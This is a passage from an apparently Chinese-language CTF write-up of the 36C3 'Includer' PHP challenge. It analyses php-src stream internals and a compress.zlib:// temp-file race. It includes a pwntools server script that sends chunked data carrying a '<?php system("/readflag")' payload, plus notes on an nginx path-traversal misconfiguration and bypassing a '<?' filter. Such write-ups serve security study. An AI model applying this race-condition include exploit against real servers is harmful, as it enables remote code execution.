class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Includer"><a href="#Includer" class="headerlink" title="Includer"></a>Includer</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:9/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [9 solves]))) = <strong>556</strong> points</p><p><strong>Description:</strong></p><p>Just sitting here and waiting for PHP 8.0 (lolphp).</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz" target="_blank" rel="noopener">includer-df39401c4c1c28ab.tar.xz (3.5 KiB)</a></p></blockquote><p>&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x6E90;&#x4EE3;&#x7801;&#x4EE5;&#x53CA;&#x90E8;&#x7F72;&#x6587;&#x4EF6;&#xFF0C;&#x6E90;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">$rand_dir = <span class="hljs-string">&apos;files/&apos;</span>.bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">mkdir($rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;mkdir&apos;</span>);</span><br><span class="line">putenv(<span class="hljs-string">&apos;TMPDIR=&apos;</span>.<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&apos;/&apos;</span>.$rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;putenv&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Hello &apos;</span>.$_POST[<span class="hljs-string">&apos;name&apos;</span>].<span class="hljs-string">&apos; your sandbox: &apos;</span>.$rand_dir.<span class="hljs-string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">&apos;file&apos;</span>]), <span class="hljs-string">&apos;&lt;?&apos;</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">        <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">&apos;file&apos;</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">finally</span> {</span><br><span class="line">    system(<span class="hljs-string">&apos;rm -rf &apos;</span>.escapeshellarg($rand_dir));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Configuration-Error"><a href="#Configuration-Error" class="headerlink" title="Configuration Error"></a>Configuration Error</h3><p>&#x5176;&#x4E2D;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6709;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#x7684;&#x914D;&#x7F6E;&#x9519;&#x8BEF;&#xFF1A;</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /.well-known {</span><br><span class="line">  autoindex on;</span><br><span class="line">  alias /var/www/html/well-known/;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F00;&#x542F;&#x4E86;&#x5217;&#x76EE;&#x5F55;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x904D;&#x5386;&#x5230;&#x4E0A;&#x5C42;&#x6587;&#x4EF6;&#x5939;&#x3002;</p><h3 id="Upload-Arbitrary-Data"><a href="#Upload-Arbitrary-Data" class="headerlink" title="Upload Arbitrary Data"></a>Upload Arbitrary Data</h3><p>&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;<code>&lt;?</code>&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x60F3;&#x5230;&#x7684;&#x662F;p&#x725B;&#x535A;&#x5BA2;&#x91CC;&#x9762;&#x6709;&#x5173;&#x6B7B;&#x4EA1; exit &#x7684;&#x5185;&#x5BB9;&#xFF0C;<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">&#x8C08;&#x4E00;&#x8C08;php://filter&#x7684;&#x5999;&#x7528;</a>&#xFF0C;&#x5948;&#x4F55;&#x539F;&#x6587;&#x7528;&#x7684;&#x662F;<code>file_put_content</code>&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x7528;&#x7684;&#x662F;<code>file_get_contents</code>&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x91CC;&#x7684;&#x5224;&#x65AD;&#x4E5F;&#x5728;&#x4F7F;&#x7528;&#x4E86;<code>file_get_contents</code>&#x51FD;&#x6570;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6709;<code>&lt;?</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#x5C31;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x4E86;&#x3002;</p><p>&#x800C;&#x4E14;&#x8FD9;&#x91CC;&#x6700;&#x5947;&#x602A;&#x7684;&#x5C31;&#x662F;&#x4E4B;&#x524D;&#x7528;&#x4E86;&#x4E00;&#x4E9B;&#x770B;&#x4F3C;&#x65E0;&#x5173;&#x7D27;&#x8981;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6BD4;&#x5982;&#x4F7F;&#x7528;&#x4E86;<code>putenv()</code>&#x51FD;&#x6570;&#x7B49;&#xFF0C;&#x7ED9;&#x4E86;&#x6211;&#x4EEC;&#x4E00;&#x4E2A; sandbox &#xFF0C;&#x7136;&#x800C;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x8868;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5565;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><p>balsn &#x961F;&#x4F0D;&#x5728;&#x516C;&#x5F00;&#x7684; wp &#x4E2D;&#x5199;&#x4E86;&#x6BD4;&#x8F83;&#x8BE6;&#x7EC6;&#x7684;&#x6E90;&#x7801;&#x5206;&#x6790;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x5C31;&#x914D;&#x5408;&#x5176;&#x4E2D;&#x7684; wp &#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#x3002;</p><p>&#x9996;&#x5148;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x7ED3;&#x8BBA;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>compress.zip://</code>&#x6D41;&#x8FDB;&#x884C;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x76F8;&#x5173;&#x539F;&#x7406;&#x3002;</p><p>&#x5728; <a href="https://github.com/php/php-src" target="_blank" rel="noopener">php-src</a> &#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x8BE5;&#x6D41;&#x7684;&#x76F8;&#x5173;&#x89E6;&#x53D1;&#x89E3;&#x6790;&#x51FD;&#x6570;<code>php_stream_gzopen</code></p><p>ext/zlib/zlib_fopen_wrapper.c</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">php_stream *<span class="hljs-title">php_stream_gzopen</span><span class="hljs-params">(php_stream_wrapper *wrapper, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  zend_string **opened_path, php_stream_context *context STREAMS_DC)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">&quot;compress.zlib://&quot;</span>, path, <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">16</span>;</span><br><span class="line">true} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">&quot;zlib:&quot;</span>, path, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">5</span>;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">trueinnerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;<code>STREAM_WILL_CAST</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x7528;&#x6765;&#x5E72;&#x561B;&#xFF0C;&#x5728;<code>main/php_streams.h</code>&#x5B9A;&#x4E49;&#x4E86;&#x8BE5;&#x6807;&#x5FD7;&#x4F4D;:</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* If you are going to end up casting the stream into a FILE* or</span></span><br><span class="line"><span class="hljs-comment"> * a socket, pass this flag and the streams/wrappers will not use</span></span><br><span class="line"><span class="hljs-comment"> * buffering mechanisms while reading the headers, so that HTTP</span></span><br><span class="line"><span class="hljs-comment"> * wrapped streams will work consistently.</span></span><br><span class="line"><span class="hljs-comment"> * If you omit this flag, streams will use buffering and should end</span></span><br><span class="line"><span class="hljs-comment"> * up working more optimally.</span></span><br><span class="line"><span class="hljs-comment"> * */</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STREAM_WILL_CAST                0x00000020</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5C06; stream &#x8F6C;&#x6362;&#x6210; FILE* &#x7684;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x5C31;&#x4E0E;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x6709;&#x5173;&#x4E86;&#x3002;</p><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;<code>php_stream_open_wrapper_ex</code>&#x51FD;&#x6570;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5728;<code>main/php_streams.h</code>&#x4E2D;&#x88AB; define &#x4E3A;<code>_php_stream_open_wrapper_ex</code>&#x3002;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI php_stream *_php_stream_open_wrapper_ex(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span><br><span class="line">truetruezend_string **opened_path, php_stream_context *context STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">if</span> (stream != <span class="hljs-literal">NULL</span> &amp;&amp; (options &amp; STREAM_MUST_SEEK)) {</span><br><span class="line">truetruephp_stream *newstream;</span><br><span class="line"></span><br><span class="line">truetrue<span class="hljs-keyword">switch</span>(php_stream_make_seekable_rel(stream, &amp;newstream,</span><br><span class="line">truetruetruetruetrue(options &amp; STREAM_WILL_CAST)</span><br><span class="line">truetruetruetruetruetrue? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE))</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">return</span> stream;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BE5;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x4E86;<code>php_stream_make_seekable_rel</code>&#xFF0C;&#x5E76;&#x5411;&#x5176;&#x4E2D;&#x4F20;&#x5165;&#x4E86;<code>STREAM_WILL_CAST</code>&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;<code>php_stream_make_seekable_rel</code>&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5728;<code>main/php_streams.h</code>&#x4E2D;&#x88AB; define &#x4E3A;<code>_php_stream_make_seekable</code>&#xFF0C;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;</p><p>main/streams/cast.c</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* {{{ php_stream_make_seekable */</span></span><br><span class="line">PHPAPI <span class="hljs-keyword">int</span> _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, <span class="hljs-keyword">int</span> flags STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-keyword">if</span> (newstream == <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_FAILED;</span><br><span class="line">true}</span><br><span class="line">true*newstream = <span class="hljs-literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="hljs-number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;<span class="hljs-built_in">seek</span> != <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue*newstream = origstream;</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_UNCHANGED;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">true<span class="hljs-comment">/* Use a tmpfile and copy the old streams contents into it */</span></span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (flags &amp; PHP_STREAM_PREFER_STDIO) {</span><br><span class="line">truetrue*newstream = php_stream_fopen_tmpfile();</span><br><span class="line">true} <span class="hljs-keyword">else</span> {</span><br><span class="line">truetrue*newstream = php_stream_temp_new();</span><br><span class="line">true}</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x679C;<code>flags</code>&#x4E0E;<code>PHP_STREAM_PREFER_STDIO</code>&#x90FD;&#x88AB;&#x8BBE;&#x7F6E;&#x7684;&#x8BDD;&#xFF0C;&#x800C;<code>PHP_STREAM_PREFER_STDIO</code>&#x5728; main/php_streams.h &#x4E2D;&#x5DF2;&#x7ECF;&#x88AB; define</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PHP_STREAM_PREFER_STDIO1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5173;&#x5FC3; flags &#x7684;&#x503C;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x786E;&#x5B9A; flags &#x7684;&#x503C;&#x975E;&#x96F6;&#x5373;&#x53EF;&#xFF0C;&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;&#x8DDF;&#x8FDB;&#x6211;&#x4EEC;&#x6613;&#x77E5; flags &#x7684;&#x5728;&#x8FD9;&#x91CC;&#x975E;&#x96F6;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x8C03;&#x7528;&#x4E86;<code>php_stream_fopen_tmpfile</code>&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E86;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x3002;</p><p>&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x5728;&#x672C;&#x673A;&#x4E0A;&#x8DD1;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x7528; pwntools &#x8D77;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7528;&#x6765;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5927;&#x6587;&#x4EF6;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> threading</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_chunk</span><span class="hljs-params">(l, data)</span>:</span></span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;{}\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>.format(hex(len(data))[<span class="hljs-number">2</span>:], data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):</span><br><span class="line">    l = listen(<span class="hljs-number">9999</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">    data1 = <span class="hljs-string">&apos;&apos;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;X&apos;</span>)</span><br><span class="line">    data2 = <span class="hljs-string">&apos;&lt;?php system(&quot;/readflag&quot;); exit(); /*&apos;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;b&apos;</span>)</span><br><span class="line">    data3 = <span class="hljs-string">&apos;c*/&apos;</span>.rjust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;c&apos;</span>)</span><br><span class="line"></span><br><span class="line">    l.recvuntil(<span class="hljs-string">&apos;\r\n\r\n&apos;</span>)</span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;HTTP/1.1 200 OK\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: exploit/revxakep\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Transfer-Encoding: chunked\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data1)</span><br><span class="line"></span><br><span class="line">    print(<span class="hljs-string">&apos;waiting...&apos;</span>)</span><br><span class="line">    print(<span class="hljs-string">&apos;sending php code...&apos;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data2)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data3)</span><br><span class="line"></span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;0\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>)</span><br><span class="line">    l.close()</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6837;&#x6211;&#x5728;&#x672C;&#x673A;&#x4E0A;&#x7528; fswatch &#x5F88;&#x660E;&#x663E;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x751F;&#x6210;&#xFF0C;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png" alt></p><h3 id="Keep-Temp-File"><a href="#Keep-Temp-File" class="headerlink" title="Keep Temp File"></a>Keep Temp File</h3><p>&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x7EC8;&#x7A76;&#x8FD8;&#x662F;&#x4F1A;&#x88AB; php &#x5220;&#x9664;&#x6389;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x8981;&#x8FDB;&#x884C;&#x5305;&#x542B;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x65B9;&#x6CD5;&#x8BA9;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5C3D;&#x53EF;&#x80FD;&#x4E45;&#x7684;&#x7559;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x624D;&#x6709;&#x673A;&#x4F1A;&#x53BB;&#x5305;&#x542B;&#x5B83;&#x3002;</p><p>&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ADE;&#x4E89;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6211;&#x4EEC;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#x8BA9;&#x5B83;&#x505C;&#x7559;&#x6BD4;&#x8F83;&#x4E45;&#x7684;&#x65F6;&#x95F4;&#xFF1A;</p><ul><li>&#x4F7F;&#x7528;&#x5927;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#xFF0C;&#x8FD9;&#x6837;&#x5728;&#x4F20;&#x8F93;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x8BA9;&#x6211;&#x4EEC;&#x5305;&#x542B;&#x5230;&#x6587;&#x4EF6;&#x4E86;&#x3002;</li><li>&#x4F7F;&#x7528; FTP &#x901F;&#x5EA6;&#x63A7;&#x5236;&#xFF0C;&#x5927;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x6839;&#x672C;&#x4E0A;&#x8FD8;&#x662F;&#x4F20;&#x8F93;&#x901F;&#x5EA6;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x65B9;&#x5F0F;&#x9650;&#x5236;&#x4F20;&#x8F93;&#x901F;&#x7387;&#xFF0C;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>compress.zlib://ftp://</code>&#x5F62;&#x5F0F;&#xFF0C;&#x63A7;&#x5236; FTP &#x901F;&#x5EA6;&#x5373;&#x53EF;</li></ul><h3 id="Bypass-Waf"><a href="#Bypass-Waf" class="headerlink" title="Bypass Waf"></a>Bypass Waf</h3><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x8981;&#x770B;&#x5982;&#x4F55;&#x6765;&#x5BF9;&#x5173;&#x952E;&#x5730;&#x65B9;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x4E86;&#x3002;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">&apos;file&apos;</span>]), <span class="hljs-string">&apos;&lt;?&apos;</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">&apos;file&apos;</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x95EE;&#x4E86;&#x5F88;&#x591A;&#x5E08;&#x5085;&#xFF0C;&#x5305;&#x62EC;&#x4E00;&#x8840;&#x7684; TokyoWesterns &#x7684;&#x961F;&#x5458;&#x4EE5;&#x53CA;&#x53C2;&#x8003;&#x4E86;&#x4E3B;&#x8981;&#x7684;&#x516C;&#x5F00; WP&#xFF0C;&#x57FA;&#x672C;&#x90FD;&#x662F;&#x5229;&#x7528;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x4E4B;&#x95F4;&#x6781;&#x7AEF;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p><p>&#x4EC0;&#x4E48;&#x610F;&#x601D;&#x5462;&#xFF1F;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5728;&#x6781;&#x5176;&#x7406;&#x60F3;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x81EA;&#x5DF1;&#x7684;&#x670D;&#x52A1;&#x5148;&#x53D1;&#x9001;&#x4E00;&#x6BB5;&#x5783;&#x573E;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x901A;&#x8FC7;<code>stripos</code>&#x7684;&#x5224;&#x65AD;&#x5C31;&#x662F;&#x6CA1;&#x6709; PHP &#x4EE3;&#x7801;&#x7684;&#x6587;&#x4EF6;&#x6570;&#x636E;&#xFF0C;&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5229;&#x7528; HTTP 